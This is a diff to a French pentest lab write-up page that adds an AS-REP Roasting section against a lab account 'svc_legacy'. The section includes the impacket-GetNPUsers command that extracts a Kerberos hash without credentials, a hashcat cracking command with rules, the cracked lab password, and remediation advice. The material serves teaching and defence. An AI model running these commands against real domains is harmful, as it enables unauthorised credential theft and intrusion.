@@ -2401,6 +2401,67 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#as-rep-roasting-svc_legacy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AS-REP Roasting — svc_legacy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AS-REP Roasting — svc_legacy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#verification-du-flag-cote-dc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vérification du flag côté DC
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraction-du-hash-sans-authentification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extraction du hash (sans authentification)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cassage-hors-ligne-avec-hashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cassage hors-ligne avec hashcat
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enseignement" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enseignement
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2767,6 +2828,35 @@
 <li><strong>Rapport de pentest final</strong> structuré</li>
 </ul>
 <p>Voir <a href="../ad-kerberoasting/">Kerberoasting + Détection Wazuh</a> pour la première partie de ce labo.</p>
+<h2 id="as-rep-roasting-svc_legacy">AS-REP Roasting — <code>svc_legacy</code><a class="headerlink" href="#as-rep-roasting-svc_legacy" title="Permanent link">&para;</a></h2>
+<p>Le compte <code>svc_legacy</code> a été configuré avec l'option <strong>"Do not require Kerberos preauthentication"</strong>, une mauvaise pratique classique qui permet d'extraire un hash Kerberos sans aucune authentification préalable sur le domaine.</p>
+<h3 id="verification-du-flag-cote-dc">Vérification du flag côté DC<a class="headerlink" href="#verification-du-flag-cote-dc" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Get-ADUser</span> <span class="n">svc_legacy</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">DoesNotRequirePreAuth</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Name   DoesNotRequirePreAuth
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>----   ---------------------
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Legacy                  True
+</code></pre></div>
+<h3 id="extraction-du-hash-sans-authentification">Extraction du hash (sans authentification)<a class="headerlink" href="#extraction-du-hash-sans-authentification" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>impacket-GetNPUsers<span class="w"> </span>LABO.LOCAL/svc_legacy<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.10.1<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</code></pre></div>
+<p>Résultat : un hash <code>$krb5asrep$23$svc_legacy@LABO.LOCAL:...</code> récupéré sans connaître le mot de passe du compte, uniquement en connaissant son nom.</p>
+<h3 id="cassage-hors-ligne-avec-hashcat">Cassage hors-ligne avec hashcat<a class="headerlink" href="#cassage-hors-ligne-avec-hashcat" title="Permanent link">&para;</a></h3>
+<p>Première tentative avec <code>rockyou.txt</code> (mode <code>18200</code>) : <code>Status: Exhausted</code>, le mot de passe n'était pas présent dans la wordlist publique.</p>
+<p><img alt="AS-REP rockyou exhausted" src="../media/purple-team/19-hashcat-asrep-rockyou-exhausted-newhash.png" /></p>
+<p>En combinant une wordlist ciblée avec les règles de mutation hashcat (<code>best64.rule</code>), le mot de passe <code>Summer2026!</code> a été retrouvé en moins d'une seconde :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep_hashes.txt<span class="w"> </span>custom.txt<span class="w"> </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best64.rule
+</code></pre></div>
+<p><img alt="AS-REP cracked" src="../media/purple-team/18-hashcat-asrep-cracked-svclegacy.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Status...........: Cracked
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Candidates.#01...: Summer2026! -&gt; Summer2026!
+</code></pre></div>
+<h3 id="enseignement">Enseignement<a class="headerlink" href="#enseignement" title="Permanent link">&para;</a></h3>
+<ul>
+<li>L'AS-REP Roasting ne nécessite <strong>aucun compte valide</strong> : un attaquant n'a besoin que d'un nom d'utilisateur.</li>
+<li>Le mot de passe <code>Summer2026!</code> suit un motif saisonnier prévisible (mois/année), un classique dans les environnements d'entreprise mal sensibilisés.</li>
+<li>Remédiation : désactiver <code>Do not require Kerberos preauthentication</code> sauf nécessité technique réelle, et appliquer une politique de mots de passe interdisant les motifs saisonniers/temporels.</li>
+</ul>
 
 
 
